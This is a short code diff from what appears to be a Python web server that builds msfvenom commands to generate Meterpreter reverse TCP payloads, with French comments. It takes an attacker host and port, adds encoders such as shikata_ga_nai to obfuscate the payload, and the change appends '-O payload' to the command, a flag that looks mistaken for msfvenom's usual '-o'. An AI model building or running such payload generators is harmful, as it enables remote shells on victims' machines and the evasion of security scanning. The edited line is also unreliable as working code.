@@ -151,7 +151,7 @@ class WebServer(http.server.SimpleHTTPRequestHandler):
         obfuscation = obfuscation.split("=")[1]
 
         # Génération du Meterpreter Reverse TCP avec Metasploit
-        msfvenom_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {output}"
+        msfvenom_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {output} -O payload"
         if obfuscation == "base64":
             msfvenom_cmd += " -e x86/shikata_ga_nai"
         elif obfuscation == "xor":
